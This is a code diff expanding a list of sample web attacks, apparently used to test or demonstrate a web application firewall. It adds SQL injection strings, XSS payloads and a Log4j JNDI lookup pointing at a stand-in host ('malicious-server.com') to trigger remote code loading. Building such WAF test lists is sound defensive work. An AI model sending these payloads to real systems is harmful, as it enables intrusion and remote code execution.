@@ -167,8 +167,11 @@ content %}
   };
 
     const WAFAttacks = [
-      {"attack": "SQL Injection", "payload": "' OR 1 = 1;"},
-      {"attack": "Cross-Site Scripting", "payload": "<scr" + "ipt>alert('test')</scr" + "ipt>"}
+      {"attack": "SQL Injection 1", "payload": "' OR 1 = 1;"},
+      {"attack": "SQL Injection 2", "payload": "' or (select (select 'abc')) = 'abc"},
+      {"attack": "Cross-Site Scripting 1", "payload": "<scr" + "ipt>confirm(\"Would you like some XSS?\")</scr" + "ipt>",},
+      {"attack": "Cross-Site Scripting 2", "payload": "<i" + "mg> src=\"/\" =_=\" title=\"onerror='prompt(\"XSS\")'\">",},
+      {"attack": "Log4j", "payload": "${jndi:ldap://malicious-server.com/exploit}",}
     ];
 
     const select = document.getElementById("WAFAttackSelect");
